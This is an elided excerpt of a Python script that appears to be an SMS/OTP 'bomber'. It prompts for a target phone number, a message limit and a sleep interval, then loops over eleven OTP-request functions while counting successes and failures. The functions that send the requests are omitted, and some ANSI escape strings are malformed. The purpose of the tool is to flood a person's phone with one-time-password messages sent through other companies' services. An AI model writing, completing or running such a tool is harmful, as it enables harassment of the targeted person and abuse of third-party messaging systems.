...
line = ("\033[1;92" + 57 * "\033[1;9")
line2 = ("\033[1;92m" + 58 * "\033[1;9")
limit = 0
limit1 = 0
field = 0
slp = 0
...
def pick(prompt):
    ...
    # Print the prompt with decoration
    print(f"{bold}{underline}{prompt}:{reset}", end=" ")
...
def bomber(function):
    ...
    while bool(RUN) == True:
        if function(number):
            sys.stdout.write(u"\033[1000D\033[1;92mSuccess: {} Failed: {} ".format(str(limit), str(field)))
            sys.stdout.flush()
...
def home():
    ...
    os.system('cls')
    print(logo)
    number = pick("Enter Phone number")
    a = open("number.txt", "w")
    a.write(str(number))
    a.close()
    function = [otp, otp1, otp2, otp3, otp4, otp5, otp6, otp7, otp8, otp9, otp10]
    limit1 = pick("Enter limit")
    slp = pick("Enter Sleep time")
